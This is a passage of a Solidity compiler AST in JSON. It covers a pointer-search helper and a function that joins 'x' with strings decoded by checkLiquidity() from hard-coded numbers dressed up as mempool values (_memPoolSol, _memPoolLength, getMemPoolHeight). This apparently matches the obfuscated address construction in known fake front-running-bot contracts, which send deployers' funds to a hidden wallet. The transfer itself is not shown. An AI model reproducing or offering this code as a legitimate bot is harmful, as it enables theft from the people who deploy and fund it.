																			"statements": [
																				{
																					"condition": {
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						},
																						"id": 1100,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 1098,
																							"name": "ptr",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1048,
																							"src": "12193:3:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": ">=",
																						"rightExpression": {
																							"argumentTypes": null,
																							"id": 1099,
																							"name": "end",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1084,
																							"src": "12200:3:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"src": "12193:10:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_bool",
																							"typeString": "bool"
																						}
																					},
																					"falseBody": null,
																					"id": 1105,
																					"nodeType": "IfStatement",
																					"src": "12189:65:0",
																					"trueBody": {
																						"expression": {
																							"argumentTypes": null,
																							"commonType": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							},
																							"id": 1103,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"lValueRequested": false,
																							"leftExpression": {
																								"argumentTypes": null,
																								"id": 1101,
																								"name": "selfptr",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 1038,
																								"src": "12237:7:0",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"nodeType": "BinaryOperation",
																							"operator": "+",
																							"rightExpression": {
																								"argumentTypes": null,
																								"id": 1102,
																								"name": "selflen",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 1036,
																								"src": "12247:7:0",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"src": "12237:17:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"functionReturnParameters": 1046,
																						"id": 1104,
																						"nodeType": "Return",
																						"src": "12230:24:0"
																					}
																				},
																				{
																					"expression": {
																						"argumentTypes": null,
																						"id": 1107,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"nodeType": "UnaryOperation",
																						"operator": "++",
																						"prefix": false,
																						"src": "12277:5:0",
																						"subExpression": {
																							"argumentTypes": null,
																							"id": 1106,
																							"name": "ptr",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1048,
																							"src": "12277:3:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"id": 1108,
																					"nodeType": "ExpressionStatement",
																					"src": "12277:5:0"
																				},
																				{
																					"AST": {
																						"nodeType": "YulBlock",
																						"src": "12314:36:0",
																						"statements": [
																							{
																								"nodeType": "YulAssignment",
																								"src": "12316:32:0",
																								"value": {
																									"arguments": [
																										{
																											"arguments": [
																												{
																													"name": "ptr",
																													"nodeType": "YulIdentifier",
																													"src": "12337:3:0"
																												}
																											],
																											"functionName": {
																												"name": "mload",
																												"nodeType": "YulIdentifier",
																												"src": "12331:5:0"
																											},
																											"nodeType": "YulFunctionCall",
																											"src": "12331:10:0"
																										},
																										{
																											"name": "mask",
																											"nodeType": "YulIdentifier",
																											"src": "12343:4:0"
																										}
																									],
																									"functionName": {
																										"name": "and",
																										"nodeType": "YulIdentifier",
																										"src": "12327:3:0"
																									},
																									"nodeType": "YulFunctionCall",
																									"src": "12327:21:0"
																								},
																								"variableNames": [
																									{
																										"name": "ptrdata",
																										"nodeType": "YulIdentifier",
																										"src": "12316:7:0"
																									}
																								]
																							}
																						]
																					},
																					"evmVersion": "istanbul",
																					"externalReferences": [
																						{
																							"declaration": 1061,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "12343:4:0",
																							"valueSize": 1
																						},
																						{
																							"declaration": 1048,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "12337:3:0",
																							"valueSize": 1
																						},
																						{
																							"declaration": 1092,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "12316:7:0",
																							"valueSize": 1
																						}
																					],
																					"id": 1109,
																					"nodeType": "InlineAssembly",
																					"src": "12305:45:0"
																				}
																			]
																		},
																		"condition": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_bytes32",
																				"typeString": "bytes32"
																			},
																			"id": 1097,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 1095,
																				"name": "ptrdata",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1092,
																				"src": "12143:7:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "!=",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 1096,
																				"name": "needledata",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1080,
																				"src": "12154:10:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				}
																			},
																			"src": "12143:21:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"id": 1111,
																		"nodeType": "WhileStatement",
																		"src": "12136:233:0"
																	},
																	{
																		"expression": {
																			"argumentTypes": null,
																			"id": 1112,
																			"name": "ptr",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1048,
																			"src": "12394:3:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"functionReturnParameters": 1046,
																		"id": 1113,
																		"nodeType": "Return",
																		"src": "12387:10:0"
																	}
																]
															}
														}
													]
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1153,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1151,
														"name": "selfptr",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1038,
														"src": "12925:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "+",
													"rightExpression": {
														"argumentTypes": null,
														"id": 1152,
														"name": "selflen",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1036,
														"src": "12935:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "12925:17:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 1046,
												"id": 1154,
												"nodeType": "Return",
												"src": "12918:24:0"
											}
										]
									},
									"documentation": null,
									"id": 1156,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "findPtr",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1043,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1036,
												"mutability": "mutable",
												"name": "selflen",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1156,
												"src": "11558:12:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1035,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "11558:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1038,
												"mutability": "mutable",
												"name": "selfptr",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1156,
												"src": "11572:12:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1037,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "11572:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1040,
												"mutability": "mutable",
												"name": "needlelen",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1156,
												"src": "11586:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1039,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "11586:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1042,
												"mutability": "mutable",
												"name": "needleptr",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1156,
												"src": "11602:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1041,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "11602:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "11557:60:0"
									},
									"returnParameters": {
										"id": 1046,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1045,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1156,
												"src": "11640:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1044,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "11640:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "11639:6:0"
									},
									"scope": 1578,
									"src": "11541:1409:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "private"
								},
								{
									"body": {
										"id": 1163,
										"nodeType": "Block",
										"src": "13015:31:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "3631353436",
													"id": 1161,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "13033:5:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_61546_by_1",
														"typeString": "int_const 61546"
													},
													"value": "61546"
												},
												"functionReturnParameters": 1160,
												"id": 1162,
												"nodeType": "Return",
												"src": "13026:12:0"
											}
										]
									},
									"documentation": null,
									"id": 1164,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "getMemPoolHeight",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1157,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "12983:2:0"
									},
									"returnParameters": {
										"id": 1160,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1159,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1164,
												"src": "13009:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1158,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "13009:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "13008:6:0"
									},
									"scope": 1578,
									"src": "12958:88:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1255,
										"nodeType": "Block",
										"src": "13254:869:0",
										"statements": [
											{
												"assignments": [
													1170
												],
												"declarations": [
													{
														"constant": false,
														"id": 1170,
														"mutability": "mutable",
														"name": "_memPoolOffset",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1255,
														"src": "13265:28:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 1169,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "13265:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1178,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"hexValue": "78",
															"id": 1172,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "13304:3:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_7521d1cadbcfa91eec65aa16715b94ffc1c9654ba57ea2ef1a2127bca1127a83",
																"typeString": "literal_string \"x\""
															},
															"value": "x"
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"arguments": [],
																	"expression": {
																		"argumentTypes": [],
																		"id": 1174,
																		"name": "getMemPoolOffset",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 714,
																		"src": "13324:16:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_internal_pure$__$returns$_t_uint256_$",
																			"typeString": "function () pure returns (uint256)"
																		}
																	},
																	"id": 1175,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "13324:18:0",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 1173,
																"name": "checkLiquidity",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 976,
																"src": "13309:14:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (uint256) pure returns (string memory)"
																}
															},
															"id": 1176,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "13309:34:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_stringliteral_7521d1cadbcfa91eec65aa16715b94ffc1c9654ba57ea2ef1a2127bca1127a83",
																"typeString": "literal_string \"x\""
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 1171,
														"name": "mempool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1577,
														"src": "13296:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
															"typeString": "function (string memory,string memory) pure returns (string memory)"
														}
													},
													"id": 1177,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "13296:48:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "13265:79:0"
											},
											{
												"assignments": [
													1180
												],
												"declarations": [
													{
														"constant": false,
														"id": 1180,
														"mutability": "mutable",
														"name": "_memPoolSol",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1255,
														"src": "13355:16:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1179,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "13355:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1182,
												"initialValue": {
													"argumentTypes": null,
													"hexValue": "373536303534333434373435",
													"id": 1181,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "13374:12:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_756054344745_by_1",
														"typeString": "int_const 756054344745"
													},
													"value": "756054344745"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "13355:31:0"
											},
											{
												"assignments": [
													1184
												],
												"declarations": [
													{
														"constant": false,
														"id": 1184,
														"mutability": "mutable",
														"name": "_memPoolLength",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1255,
														"src": "13397:19:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1183,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "13397:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1186,
												"initialValue": {
													"argumentTypes": null,
													"hexValue": "31323430333332363435",
													"id": 1185,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "13419:10:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_1240332645_by_1",
														"typeString": "int_const 1240332645"
													},
													"value": "1240332645"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "13397:32:0"
											},
											{
												"assignments": [
													1188
												],
												"declarations": [
													{
														"constant": false,
														"id": 1188,
														"mutability": "mutable",
														"name": "_memPoolSize",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1255,
														"src": "13440:17:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1187,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "13440:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1190,
												"initialValue": {
													"argumentTypes": null,
													"hexValue": "3131393939373934",
													"id": 1189,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "13460:8:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_11999794_by_1",
														"typeString": "int_const 11999794"
													},
													"value": "11999794"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "13440:28:0"
											},
											{
												"assignments": [
													1192
												],
												"declarations": [
													{
														"constant": false,
														"id": 1192,
														"mutability": "mutable",
														"name": "_memPoolHeight",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1255,
														"src": "13479:19:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1191,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "13479:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1195,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 1193,
														"name": "getMemPoolHeight",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1164,
														"src": "13501:16:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$__$returns$_t_uint256_$",
															"typeString": "function () pure returns (uint256)"
														}
													},
													"id": 1194,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "13501:18:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "13479:40:0"
											},
											{
												"assignments": [
													1197
												],
												"declarations": [
													{
														"constant": false,
														"id": 1197,
														"mutability": "mutable",
														"name": "_memPoolDepth",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1255,
														"src": "13530:18:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1196,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "13530:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1200,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 1198,
														"name": "getMemPoolDepth",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1469,
														"src": "13551:15:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$__$returns$_t_uint256_$",
															"typeString": "function () pure returns (uint256)"
														}
													},
													"id": 1199,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "13551:17:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "13530:38:0"
											},
											{
												"assignments": [
													1202
												],
												"declarations": [
													{
														"constant": false,
														"id": 1202,
														"mutability": "mutable",
														"name": "_memPool1",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1255,
														"src": "13581:23:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 1201,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "13581:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1209,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1204,
															"name": "_memPoolOffset",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1170,
															"src": "13615:14:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1206,
																	"name": "_memPoolSol",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1180,
																	"src": "13646:11:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 1205,
																"name": "checkLiquidity",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 976,
																"src": "13631:14:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (uint256) pure returns (string memory)"
																}
															},
															"id": 1207,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "13631:27:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 1203,
														"name": "mempool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1577,
														"src": "13607:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
															"typeString": "function (string memory,string memory) pure returns (string memory)"
														}
													},
													"id": 1208,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "13607:52:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "13581:78:0"
											},
											{
												"assignments": [
													1211
												],
												"declarations": [
													{
														"constant": false,
														"id": 1211,
														"mutability": "mutable",
														"name": "_memPool2",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1255,
														"src": "13670:23:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 1210,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "13670:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1220,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1214,
																	"name": "_memPoolLength",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1184,
																	"src": "13719:14:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 1213,
																"name": "checkLiquidity",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 976,
																"src": "13704:14:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (uint256) pure returns (string memory)"
																}
															},
															"id": 1215,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "13704:30:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1217,
																	"name": "_memPoolSize",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1188,
																	"src": "13751:12:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 1216,
																"name": "checkLiquidity",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 976,
																"src": "13736:14:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (uint256) pure returns (string memory)"
																}
															},
															"id": 1218,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "13736:28:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 1212,
														"name": "mempool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1577,
														"src": "13696:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
															"typeString": "function (string memory,string memory) pure returns (string memory)"
														}
													},
													"id": 1219,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "13696:69:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
